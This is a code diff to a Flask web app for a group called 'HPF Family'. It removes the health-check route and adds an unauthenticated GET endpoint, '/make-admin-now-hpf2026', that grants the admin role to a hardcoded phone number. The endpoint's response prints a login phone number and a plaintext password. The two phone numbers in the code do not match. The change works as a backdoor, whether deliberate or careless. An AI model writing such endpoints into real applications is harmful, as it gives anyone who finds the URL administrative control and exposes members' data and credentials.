@@ -327,9 +327,28 @@ def add_program():
             conn.commit()
     return jsonify(ok=True), 201
 
-@app.get("/health")
-def health():
-    return jsonify(status="ok", service="HPF Family")
+@app.get("/make-admin-now-hpf2026")
+def make_admin_now():
+    try:
+        with get_db() as conn:
+            with conn.cursor() as cur:
+                cur.execute("""
+                    UPDATE members 
+                    SET role = 'admin', 
+                        name = %s,
+                        campus = %s,
+                        connection = %s
+                    WHERE phone = %s
+                """, (
+                    "HPFFAMILY",
+                    "HPF Family",
+                    "HPF Leadership",
+                    "07025329640"
+                ))
+                conn.commit()
+        return "SUCCESS! Admin is ready. Login with phone 09157227521 and password HPFFAMILY001"
+    except Exception as e:
+        return f"Error: {str(e)}"
 
 @app.route("/")
 def home():
